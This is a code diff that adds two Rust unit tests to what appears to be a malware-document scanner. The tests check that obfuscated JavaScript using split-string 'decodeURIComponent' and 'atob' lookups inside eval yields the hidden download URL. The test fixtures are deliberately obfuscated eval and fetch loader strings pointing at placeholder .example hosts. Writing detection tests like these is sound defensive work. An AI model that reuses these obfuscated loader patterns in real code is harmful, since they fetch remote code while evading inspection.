@@ -9396,6 +9396,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_direct_variable_member_decodeuricomponent_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var f = "decode" + "URIComponent"; eval(window[f]("https%3A%2F%2Fdirect-member-decode-js.example%2Fp"))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://direct-member-decode-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS direct variable member decodeURIComponent URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_decodeuri_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"eval(decodeURI("https%3A%2F%2Fdecodeuri-js.example%2Fp"))"#.to_vec();
@@ -9831,6 +9850,28 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS variable member atob payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_direct_variable_member_atob_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://direct-member-atob-var-js.example/p')",
+        );
+        let js = format!(r#"var f = "a" + "tob"; eval(window[f]("{encoded}"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://direct-member-atob-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS direct variable member atob payload URL missed: {:?}",
             env.traits
         );
     }
